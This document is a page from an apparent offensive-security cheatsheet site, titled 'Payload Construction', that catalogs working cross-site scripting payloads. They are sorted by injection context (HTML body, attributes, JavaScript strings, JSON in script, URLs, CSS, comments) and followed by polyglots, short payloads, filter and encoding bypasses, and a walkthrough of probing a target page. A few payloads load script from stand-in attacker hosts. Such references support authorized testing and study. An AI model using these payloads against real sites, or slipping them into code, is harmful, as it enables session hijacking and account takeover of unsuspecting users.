@@ -1,0 +1,395 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Payload Construction · ArxOS cheatsheets</title><link rel="stylesheet" href="../../../../codex.css"></head>
+<body><header class="cx-top"><a class="cx-brand" href="../../../../index.html">ArxOS</a><span class="cx-sub">Cheatsheets</span>
+<a class="cx-search-link" href="../../../../index.html#search">Search</a></header>
+<main class="cx-main"><nav class="cx-crumbs"><a href="../../../../index.html">Cheatsheets</a> › Web › XSS</nav><h1>Payload Construction</h1><p class="cx-lede">Context-aware XSS payload crafting - the escape-then-execute discipline that distinguishes operators from script-kiddies, payload catalogs organized by escape context, polyglot payloads that fire across multiple contexts, minimal payloads for length-restricted fields, and the canonical patterns for breaking out of HTML attributes, JavaScript strings, JSON values, and URL contexts.</p><div class="cx-tags"><span class="cx-tag">MITRE T1059.007</span><span class="cx-tag">D3FEND D3-AH</span><span class="cx-tag">IMPACT SessionTakeover, AccountTakeover</span><span class="cx-tag">OWASP A05</span></div><article class="cx-body"><h2 id="tldr">TL;DR</h2>
+<p>XSS payload construction is two steps performed in order: <strong>escape</strong> the surrounding context, then <strong>execute</strong> your code. A payload that doesn't escape first lands in the data layer and never executes. A payload that escapes too aggressively breaks the surrounding HTML and doesn't render. The catalog below organizes payloads by what they escape <em>out of</em>.</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code># 1. Identify the context - what is your input embedded in?
+# 2. Pick the escape: characters that terminate the current context
+# 3. Append the execution: JavaScript or HTML that runs after escape
+
+# HTML body - no escape needed
+&lt;svg onload=alert(1)&gt;
+
+# Double-quoted attribute - escape is &quot;
+&quot; onmouseover=alert(1) x=&quot;
+
+# Single-quoted attribute - escape is &#x27;
+&#x27; onmouseover=alert(1) x=&#x27;
+
+# JS string (double-quoted) - escape is &quot;; for terminate, then //
+&quot;; alert(1); //
+
+# JSON inside script - escape is &lt;/script&gt;
+&lt;/script&gt;&lt;svg onload=alert(1)&gt;
+
+# href attribute - no escape needed, use javascript: scheme
+javascript:alert(1)
+
+# Polyglot - works in many contexts at once
+jaVasCript:/*-/*`/*\`/*&#x27;/*&quot;/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e</code></pre></figure>
+<p>Success indicator: payload executes the expected JavaScript in the victim's browser. <code>alert(document.domain)</code> proves same-origin execution.</p>
+<h2 id="the-escape-then-execute-discipline">The escape-then-execute discipline</h2>
+<p>A common failure mode for new XSS operators: paste <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> everywhere, wonder why it doesn't fire. The fix is mechanical - <em>understand what your input lands in, then craft a payload that breaks out of that context first</em>.</p>
+<p>A walk-through:</p>
+<h3 id="example-json-in-script-reflection">Example - JSON-in-script reflection</h3>
+<p>Page source:</p>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;script&gt;
+  window.config = {&quot;user&quot;: &quot;VICTIM_INPUT_HERE&quot;, &quot;role&quot;: &quot;guest&quot;};
+&lt;/script&gt;</code></pre></figure>
+<p>You inject <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>. The rendered output:</p>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;script&gt;
+  window.config = {&quot;user&quot;: &quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;, &quot;role&quot;: &quot;guest&quot;};
+&lt;/script&gt;</code></pre></figure>
+<p>What happens? The <code>&lt;script&gt;</code> element's contents are JavaScript, not HTML. The literal characters <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> inside a JS string are just text. The browser doesn't parse a nested <code>&lt;script&gt;</code> tag here - it's reading JavaScript, not HTML.</p>
+<p><strong>The XSS doesn't fire.</strong></p>
+<p>But:</p>
+<p>You inject <code>&lt;/script&gt;&lt;svg onload=alert(1)&gt;</code>. The rendered output:</p>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;script&gt;
+  window.config = {&quot;user&quot;: &quot;&lt;/script&gt;&lt;svg onload=alert(1)&gt;&quot;, &quot;role&quot;: &quot;guest&quot;};
+&lt;/script&gt;</code></pre></figure>
+<p>What happens? The browser's HTML parser tokenizes the page before the JavaScript parser runs. The HTML tokenizer sees <code>&lt;/script&gt;</code> as a script-close tag, regardless of where it appears in the surrounding content. The script block ends. The <code>&lt;svg onload=...&gt;</code> that follows is HTML. The <code>onload</code> fires.</p>
+<p><strong>The XSS fires.</strong></p>
+<p>The difference between failure and success: knowing that <code>&lt;/script&gt;</code> is the escape for "inside a <code>&lt;script&gt;</code> block, even inside a JS string."</p>
+<p>This is the discipline. Every context has its own escape. The catalog below.</p>
+<h2 id="payload-catalog-by-context">Payload catalog by context</h2>
+<h3 id="html-body-context">HTML body context</h3>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;!-- Input lands as text between tags --&gt;
+&lt;p&gt;HERE&lt;/p&gt;
+&lt;div&gt;HERE&lt;/div&gt;
+&lt;h1&gt;Welcome HERE!&lt;/h1&gt;</code></pre></figure>
+<p>No escape needed; introduce a new tag:</p>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;svg onload=alert(1)&gt;                          &lt;!-- shortest universally-firing payload --&gt;
+&lt;img src=x onerror=alert(1)&gt;                   &lt;!-- bypasses some script-tag filters --&gt;
+&lt;script&gt;alert(1)&lt;/script&gt;                      &lt;!-- classic, blocked by many filters --&gt;
+&lt;iframe srcdoc=&quot;&lt;script&gt;alert(parent.document.domain)&lt;/script&gt;&quot;&gt;
+&lt;body onload=alert(1)&gt;                         &lt;!-- requires no existing body tag --&gt;
+&lt;details open ontoggle=alert(1)&gt;               &lt;!-- HTML5 element --&gt;
+&lt;video&gt;&lt;source onerror=alert(1)&gt;&lt;/video&gt;
+&lt;audio src=x onerror=alert(1)&gt;
+&lt;marquee onstart=alert(1)&gt;                     &lt;!-- legacy, sometimes survives modern filters --&gt;</code></pre></figure>
+<h3 id="attribute-value-context-double-quoted">Attribute value context (double-quoted)</h3>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;!-- Input lands inside a double-quoted attribute --&gt;
+&lt;input value=&quot;HERE&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;csrf&quot; value=&quot;HERE&quot;&gt;
+&lt;a href=&quot;/search?q=HERE&quot;&gt;link&lt;/a&gt;</code></pre></figure>
+<p>Escape with <code>"</code>, add new attribute:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>&quot; onmouseover=alert(1) x=&quot;                     &lt;!-- needs hover --&gt;
+&quot; autofocus onfocus=alert(1) x=&quot;               &lt;!-- auto-fires on input fields --&gt;
+&quot; onclick=alert(1) x=&quot;                         &lt;!-- needs click --&gt;
+&quot;&gt;&lt;svg onload=alert(1)&gt;                        &lt;!-- escape attribute AND tag --&gt;
+&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;                    &lt;!-- escape then new script --&gt;
+&quot; onpointerover=alert(1) x=&quot;                   &lt;!-- newer event, bypasses old filters --&gt;</code></pre></figure>
+<p>For <code>&lt;input&gt;</code> specifically, <code>autofocus onfocus=</code> is the gold standard - fires immediately on page load with no user action.</p>
+<h3 id="attribute-value-context-single-quoted">Attribute value context (single-quoted)</h3>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;input value=&#x27;HERE&#x27;&gt;
+&lt;a href=&#x27;/page?q=HERE&#x27;&gt;link&lt;/a&gt;</code></pre></figure>
+<p>Symmetric to double-quoted; swap quotes:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>&#x27; onmouseover=alert(1) x=&#x27;
+&#x27; autofocus onfocus=alert(1) x=&#x27;
+&#x27;&gt;&lt;svg onload=alert(1)&gt;</code></pre></figure>
+<h3 id="attribute-value-context-unquoted">Attribute value context (unquoted)</h3>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;input value=HERE&gt;</code></pre></figure>
+<p>Space, tab, or slash to break:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code> onmouseover=alert(1)                          &lt;!-- space --&gt;
+/onmouseover=alert(1)                          &lt;!-- slash works as attribute separator in HTML5 --&gt;
+%09onmouseover=alert(1)                        &lt;!-- tab via URL encoding --&gt;
+%0Aonmouseover=alert(1)                        &lt;!-- newline --&gt;</code></pre></figure>
+<h3 id="js-context-inside-a-double-quoted-string">JS context - inside a double-quoted string</h3>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;script&gt;var query = &quot;HERE&quot;;&lt;/script&gt;</code></pre></figure>
+<p>Escape: close the string, add JS, comment out the rest:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>&quot;; alert(1); //
+&quot;; alert(1); var z=&quot;                           &lt;!-- if // is filtered, use a dummy variable --&gt;
+\&quot;; alert(1); //                               &lt;!-- if &quot; is auto-backslashed, try double-escape --&gt;</code></pre></figure>
+<p>The <code>;</code> after the escape terminates the JS statement; <code>//</code> comments out the original closing <code>"</code>.</p>
+<h3 id="js-context-inside-a-single-quoted-string">JS context - inside a single-quoted string</h3>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;script&gt;var query = &#x27;HERE&#x27;;&lt;/script&gt;</code></pre></figure>
+<figure class="cx-code"><figcaption></figcaption><pre><code>&#x27;; alert(1); //
+&#x27;;alert(1)//</code></pre></figure>
+<h3 id="js-context-inside-a-template-literal">JS context - inside a template literal</h3>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;script&gt;var greeting = `Hello, HERE`;&lt;/script&gt;</code></pre></figure>
+<p>Template literals allow <code>${}</code> interpolation, evaluated as JS:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>${alert(1)}
+${alert(document.domain)}</code></pre></figure>
+<p>No string-escape needed; the <code>${...}</code> placeholder syntax invokes JS directly.</p>
+<h3 id="js-context-unquoted-numeric-variable">JS context - unquoted (numeric / variable)</h3>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;script&gt;var userId = HERE;&lt;/script&gt;</code></pre></figure>
+<p>Pure JavaScript, no quote to break:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>alert(1)
+0;alert(1);0
+1-alert(1)-1                                   &lt;!-- ensures the surrounding code still parses --&gt;</code></pre></figure>
+<h3 id="json-inside-script-context">JSON-inside-script context</h3>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;script&gt;var data = {&quot;name&quot;: &quot;HERE&quot;};&lt;/script&gt;</code></pre></figure>
+<p>The browser's HTML parser tokenizes <code>&lt;/script&gt;</code> before JS parsing:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>&lt;/script&gt;&lt;svg onload=alert(1)&gt;
+&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+&lt;/ScRiPt&gt;&lt;svg onload=alert(1)&gt;                 &lt;!-- case-insensitive match --&gt;
+&lt;/script   &gt;&lt;svg onload=alert(1)&gt;              &lt;!-- whitespace allowed inside closing tag --&gt;</code></pre></figure>
+<p>If the application JSON-encodes the value (escaping <code>&lt;</code> to <code>\u003c</code>), this doesn't work - JSON-encoded content is safe in JS strings <em>and</em> in HTML inside scripts. Modern apps that properly JSON.stringify their output aren't vulnerable to this class.</p>
+<h3 id="url-attribute-context">URL attribute context</h3>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;a href=&quot;HERE&quot;&gt;click&lt;/a&gt;
+&lt;iframe src=&quot;HERE&quot;&gt;</code></pre></figure>
+<p><code>javascript:</code> pseudo-scheme:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>javascript:alert(1)
+javascript:alert(document.domain)
+javasc&amp;Tab;ript:alert(1)                       &lt;!-- HTML entity injection mid-scheme --&gt;
+JaVaScRiPt:alert(1)                            &lt;!-- case bypass for filters checking exact match --&gt;
+data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;      &lt;!-- data URI, sometimes works --&gt;</code></pre></figure>
+<p>Or break the attribute:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+&quot;&gt;&lt;svg onload=alert(1)&gt;</code></pre></figure>
+<p>For <code>href</code>, requires user click. For <code>iframe src</code>, auto-loads - but modern browsers restrict cross-context <code>javascript:</code> URLs in iframes.</p>
+<h3 id="css-context">CSS context</h3>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;style&gt;body { color: HERE; }&lt;/style&gt;
+&lt;div style=&quot;color: HERE&quot;&gt;text&lt;/div&gt;</code></pre></figure>
+<p>Direct JS execution from CSS is no longer possible (IE-only <code>expression()</code> is dead). Two indirect paths:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>&lt;/style&gt;&lt;svg onload=alert(1)&gt;                  &lt;!-- escape style block --&gt;
+&quot;&gt;&lt;svg onload=alert(1)&gt;                        &lt;!-- escape style attribute --&gt;</code></pre></figure>
+<h3 id="comment-context">Comment context</h3>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;!-- User comment: HERE --&gt;</code></pre></figure>
+<p>Escape the comment:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>--&gt;&lt;svg onload=alert(1)&gt;&lt;!--</code></pre></figure>
+<h3 id="noscript-context"><code>&lt;noscript&gt;</code> context</h3>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;noscript&gt;HERE&lt;/noscript&gt;</code></pre></figure>
+<p><code>&lt;noscript&gt;</code> content is parsed only when JS is disabled. If JS is enabled, the content stays text. But - <em>the HTML parser still tokenizes</em>, just doesn't render. mXSS-style attacks can move the payload out of <code>&lt;noscript&gt;</code> during DOM manipulation:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>&lt;/noscript&gt;&lt;svg onload=alert(1)&gt;</code></pre></figure>
+<h2 id="polyglot-payloads">Polyglot payloads</h2>
+<p>A payload that fires in multiple contexts simultaneously. Useful when you don't know the exact context, or for spray-and-pray fuzzing.</p>
+<h3 id="the-mario-heiderich-polyglot">The Mario Heiderich polyglot</h3>
+<p>The famous one:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>jaVasCript:/*-/*`/*\`/*&#x27;/*&quot;/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e</code></pre></figure>
+<p>Designed to fire in:</p>
+<ul>
+<li><code>href</code> attribute (the <code>javascript:</code> scheme)</li>
+<li>HTML body (the <code>&lt;svg onload&gt;</code> at end)</li>
+<li>Inside <code>&lt;style&gt;</code>, <code>&lt;title&gt;</code>, <code>&lt;textarea&gt;</code>, <code>&lt;script&gt;</code>, comment - escaped via the closing-tag sequence</li>
+<li>JS string contexts via the <code>*/</code> and <code>//</code> comments</li>
+</ul>
+<p>Drawbacks: long, conspicuous, blocked by many WAFs because of its very obviousness.</p>
+<h3 id="shorter-polyglots">Shorter polyglots</h3>
+<figure class="cx-code"><figcaption></figcaption><pre><code>&quot;&gt;&#x27;-&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+&quot;&gt;&lt;svg onload=alert(1)&gt;
+&quot;-prompt(1)-&quot;
+&#x27;-alert(1)-&#x27;
+javascript:&quot;/*&#x27;/*`/*--&gt;&lt;/noscript&gt;&lt;/title&gt;&lt;/textarea&gt;&lt;/style&gt;&lt;/template&gt;&lt;/noembed&gt;&lt;/script&gt;&lt;html onmouseover=&quot;/*&amp;lt;svg/*/onload=alert()//</code></pre></figure>
+<p>Each tries different escape sequences. Test them all when context is unknown.</p>
+<h2 id="minimal-payloads-length-restricted-contexts">Minimal payloads (length-restricted contexts)</h2>
+<p>Some fields limit input to 16-30 characters. Short payloads:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>&lt;svg/onload=alert(1)&gt;                          22 chars
+&lt;a href=//&lt;attacker&gt;/x.js&gt;                     varies - relies on external script load
+&lt;script src=//x.cc&gt;                            18 chars - external script (DNS-shortened domain)
+&lt;svg onload=alert``&gt;                           20 chars - tagged template, no parens</code></pre></figure>
+<p>The <code>alert\</code>`<code>form uses tagged template literals to invoke</code>alert<code>without parentheses - bypasses filters that block</code>(`.</p>
+<p>For ultra-short:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>&lt;svg/onload=eval(name)&gt;                        21 chars</code></pre></figure>
+<p>Combine with <code>window.name='alert(1)'</code> set by attacker page - the target's <code>eval(name)</code> executes the attacker-set name.</p>
+<h2 id="payloads-without-specific-characters">Payloads without specific characters</h2>
+<p>Filter regimes that block specific characters require structural workarounds.</p>
+<h3 id="without-parentheses">Without parentheses</h3>
+<p>Many filters block <code>(</code> because it appears in <code>alert(...)</code>. Alternatives:</p>
+<figure class="cx-code"><figcaption>javascript</figcaption><pre><code class="language-javascript">alert`1`                                       // tagged template literal
+onerror=alert;throw 1                          // throw triggers onerror handler with arg
+[1].find(alert)                                // method that calls callback with arg
+Object.defineProperty(...,{get:alert,...})     // getter trick</code></pre></figure>
+<h3 id="without-quotes">Without quotes</h3>
+<figure class="cx-code"><figcaption>javascript</figcaption><pre><code class="language-javascript">alert(/xss/.source)                            // regex source - string-typed without quotes
+alert(String.fromCharCode(88,83,83))           // build string from char codes</code></pre></figure>
+<h3 id="without-spaces">Without spaces</h3>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;svg/onload=alert(1)&gt;                          &lt;!-- slash separates tag and attribute --&gt;
+&lt;svg%09onload=alert(1)&gt;                        &lt;!-- tab via URL encoding --&gt;
+&lt;img/src/onerror=alert(1)&gt;                     &lt;!-- multiple slashes work in HTML5 --&gt;</code></pre></figure>
+<h3 id="without-alphabetic-characters">Without alphabetic characters</h3>
+<p>The infamous one. Pure punctuation JavaScript:</p>
+<figure class="cx-code"><figcaption>javascript</figcaption><pre><code class="language-javascript">[][(![]+[])[+!![]]+([][[]]+[])[+!![]]+...]</code></pre></figure>
+<p>Each <code>[]+[]</code> expression evaluates to a string ("undefined"); index into it for letters. Build "alert" character by character, then call. The resulting payload is enormous and conspicuous; included for completeness, never useful in practice.</p>
+<h2 id="browser-specific-quirks">Browser-specific quirks</h2>
+<p>XSS sometimes works in one browser and not another:</p>
+<table>
+<thead>
+<tr>
+<th>Quirk</th>
+<th>Browser(s)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>&lt;iframe srcdoc&gt;</code></td>
+<td>All modern browsers</td>
+</tr>
+<tr>
+<td><code>javascript:</code> in <code>&lt;iframe src&gt;</code></td>
+<td>Cross-context blocked in modern Chrome/Firefox</td>
+</tr>
+<tr>
+<td><code>onfocus</code> on <code>&lt;input autofocus&gt;</code></td>
+<td>All browsers</td>
+</tr>
+<tr>
+<td><code>&lt;details open ontoggle&gt;</code></td>
+<td>All but very old Safari</td>
+</tr>
+<tr>
+<td><code>Function('')()</code> constructor</td>
+<td>All browsers</td>
+</tr>
+<tr>
+<td><code>data:text/html</code> navigation</td>
+<td>Restricted in modern browsers</td>
+</tr>
+<tr>
+<td><code>URL</code> constructor with <code>javascript:</code></td>
+<td>Chrome only</td>
+</tr>
+<tr>
+<td>HTML entity in scheme <code>javasc&amp;Tab;ript:</code></td>
+<td>Browser tolerance varies</td>
+</tr>
+</tbody>
+</table>
+<p>When a payload works in Firefox but not Chrome (or vice versa), check whether the victim model uses a specific browser. Internal corporate apps often constrain to Chrome or Edge; admins are reachable via that constraint.</p>
+<h2 id="encoding-tricks">Encoding tricks</h2>
+<p>Sometimes the payload itself is fine but it doesn't survive transport. Encoding helps it through filters.</p>
+<h3 id="html-entities">HTML entities</h3>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;svg onload=alert&amp;#40;1&amp;#41;&gt;                  &lt;!-- &amp;#40;= ( &amp;#41;= ) --&gt;
+&lt;svg onload=alert&amp;lpar;1&amp;rpar;&gt;                &lt;!-- named entities --&gt;
+&lt;svg onload=&quot;alert&amp;#x28;1&amp;#x29;&quot;&gt;              &lt;!-- hex entities --&gt;</code></pre></figure>
+<h3 id="url-encoding">URL encoding</h3>
+<figure class="cx-code"><figcaption></figcaption><pre><code>%3Csvg%20onload%3Dalert(1)%3E                  &lt;!-- &lt;svg onload=alert(1)&gt; --&gt;
+%3Csvg%2Fonload%3Dalert%281%29%3E              &lt;!-- with paren encoding --&gt;</code></pre></figure>
+<h3 id="double-url-encoding">Double URL encoding</h3>
+<figure class="cx-code"><figcaption></figcaption><pre><code>%253Csvg%2520onload%253Dalert(1)%253E</code></pre></figure>
+<p>Bypasses filters that decode-then-scan once. The server's second decode reveals the payload.</p>
+<h3 id="unicode-escape">Unicode escape</h3>
+<figure class="cx-code"><figcaption>javascript</figcaption><pre><code class="language-javascript">\u003cscript\u003ealert(1)\u003c/script\u003e</code></pre></figure>
+<p>In some JS contexts (eval, Function constructor), Unicode escapes within identifiers and strings are evaluated.</p>
+<h3 id="hex-escape">Hex escape</h3>
+<figure class="cx-code"><figcaption>javascript</figcaption><pre><code class="language-javascript">\x3cscript\x3ealert(1)\x3c/script\x3e</code></pre></figure>
+<p>Inside JS string literals, <code>\x3c</code> = <code>&lt;</code>. The string-context payload becomes valid even when the original parser would reject <code>&lt;</code>.</p>
+<h2 id="a-worked-walkthrough-payload-iteration">A worked walkthrough - payload iteration</h2>
+<p>Target page renders <code>?msg=</code> parameter into:</p>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;div class=&quot;alert&quot;&gt;&lt;b&gt;HERE&lt;/b&gt;&lt;/div&gt;</code></pre></figure>
+<h3 id="round-1-probe">Round 1 - Probe</h3>
+<figure class="cx-code"><figcaption></figcaption><pre><code>?msg=&lt;svg onload=alert(1)&gt;</code></pre></figure>
+<p>Response:</p>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;div class=&quot;alert&quot;&gt;&lt;b&gt;&amp;lt;svg onload=alert(1)&amp;gt;&lt;/b&gt;&lt;/div&gt;</code></pre></figure>
+<p><code>&lt;</code> and <code>&gt;</code> HTML-encoded. Direct injection blocked.</p>
+<h3 id="round-2-test-for-what-survives">Round 2 - Test for what survives</h3>
+<figure class="cx-code"><figcaption></figcaption><pre><code>?msg=test&quot;quote&#x27;and&lt;more&gt;chars&amp;amp;</code></pre></figure>
+<p>Response:</p>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;div class=&quot;alert&quot;&gt;&lt;b&gt;test&amp;quot;quote&amp;#039;and&amp;lt;more&amp;gt;chars&amp;amp;amp;&lt;/b&gt;&lt;/div&gt;</code></pre></figure>
+<p>Everything encoded. No obvious escape character. Move on or look for other rendering surfaces.</p>
+<h3 id="round-3-find-a-different-reflection">Round 3 - Find a different reflection</h3>
+<p>Try a different param. After more probing, find that <code>?type=</code> reflects into:</p>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;input type=&quot;HERE&quot;&gt;</code></pre></figure>
+<p>Submit:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>?type=&quot;&gt;&lt;svg onload=alert(1)&gt;</code></pre></figure>
+<p>Response:</p>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;input type=&quot;&quot;&gt;&lt;svg onload=alert(1)&gt;&quot;&gt;</code></pre></figure>
+<p>XSS fires. The <code>?msg=</code> reflection was the red herring; <code>?type=</code> is the real bug.</p>
+<p>The lesson: don't fixate on one reflection. The same page often has multiple inputs reflecting into different contexts with different escaping treatments. Probe all of them.</p>
+<h2 id="quick-reference">Quick reference</h2>
+<table>
+<thead>
+<tr>
+<th>Context</th>
+<th>Escape</th>
+<th>Payload after escape</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>HTML body</td>
+<td>none</td>
+<td><code>&lt;svg onload=alert(1)&gt;</code></td>
+</tr>
+<tr>
+<td>Attribute (double-quoted)</td>
+<td><code>"</code></td>
+<td><code>" onmouseover=alert(1) x="</code></td>
+</tr>
+<tr>
+<td>Attribute (single-quoted)</td>
+<td><code>'</code></td>
+<td><code>' onmouseover=alert(1) x='</code></td>
+</tr>
+<tr>
+<td>Attribute (unquoted)</td>
+<td><code></code> or <code>/</code></td>
+<td><code>/onmouseover=alert(1)</code></td>
+</tr>
+<tr>
+<td>JS string (double)</td>
+<td><code>"</code></td>
+<td><code>"; alert(1); //</code></td>
+</tr>
+<tr>
+<td>JS string (single)</td>
+<td><code>'</code></td>
+<td><code>'; alert(1); //</code></td>
+</tr>
+<tr>
+<td>JS template literal</td>
+<td>none</td>
+<td><code>${alert(1)}</code></td>
+</tr>
+<tr>
+<td>JS unquoted</td>
+<td>none</td>
+<td><code>alert(1)</code></td>
+</tr>
+<tr>
+<td>JSON in script</td>
+<td><code>&lt;/script&gt;</code></td>
+<td><code>&lt;/script&gt;&lt;svg onload=alert(1)&gt;</code></td>
+</tr>
+<tr>
+<td>URL attribute</td>
+<td>none</td>
+<td><code>javascript:alert(1)</code></td>
+</tr>
+<tr>
+<td>Auto-firing in attribute</td>
+<td><code>"</code></td>
+<td><code>" autofocus onfocus=alert(1) x="</code></td>
+</tr>
+<tr>
+<td>Without parens</td>
+<td>template literal</td>
+<td><code>alert`1`</code></td>
+</tr>
+<tr>
+<td>Without quotes</td>
+<td>regex source</td>
+<td><code>alert(/xss/.source)</code></td>
+</tr>
+<tr>
+<td>Without spaces</td>
+<td>slash</td>
+<td><code>&lt;svg/onload=alert(1)&gt;</code></td>
+</tr>
+<tr>
+<td>Polyglot (short)</td>
+<td>mixed</td>
+<td><code>"-prompt(1)-"</code></td>
+</tr>
+<tr>
+<td>URL-encoded</td>
+<td>%xx</td>
+<td><code>%3Csvg%20onload%3Dalert(1)%3E</code></td>
+</tr>
+<tr>
+<td>Double-encoded</td>
+<td>%25xx</td>
+<td><code>%253Csvg%2520onload%253Dalert(1)%253E</code></td>
+</tr>
+<tr>
+<td>Confirm same-origin</td>
+<td>proof</td>
+<td><code>alert(document.domain)</code></td>
+</tr>
+</tbody>
+</table>
+<p>For WAF/filter bypasses when payloads are blocked, see <a href="../filter-bypasses/index.html">Filter bypasses</a>. For blind XSS payload patterns specifically tailored to admin renderers you can't observe directly, see <a href="../blind-xss/index.html">Blind XSS</a>.</p></article><nav class="cx-pager"><a class="cx-prev" href="../phishing-injection/index.html">Previous: Phishing Injection</a><a class="cx-next" href="../filter-bypasses/index.html">Next: Filter Bypasses</a></nav></main>
+<footer class="cx-foot"><p>For authorized testing and study only. <a href="../../../../license.html">License</a></p></footer>
+<script src="../../../../codex.js"></script></body></html>
